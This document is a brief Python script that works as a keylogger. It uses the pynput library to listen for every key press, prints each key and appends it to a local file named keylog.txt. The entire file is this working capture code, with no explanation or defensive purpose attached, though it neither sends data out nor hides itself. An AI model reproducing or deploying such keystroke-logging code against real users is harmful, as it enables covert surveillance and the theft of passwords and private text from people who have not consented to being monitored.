from pynput import keyboard 
from pynput.keyboard import Listener 
from pynput import keyboard 
def keypressed(key):
    print(str(key))
    with open("keylog.txt", 'a') as logkey:
        try:
            char=key.char
            if char:
                logkey.write(char)
            else:
                logkey.write(f'[{key}]')
        except AttributeError:
            logkey.write(f'[{key}]') 
if __name__=="__main__":
    listener=keyboard.Listener(on_press=keypressed)
    listener.start()
    input()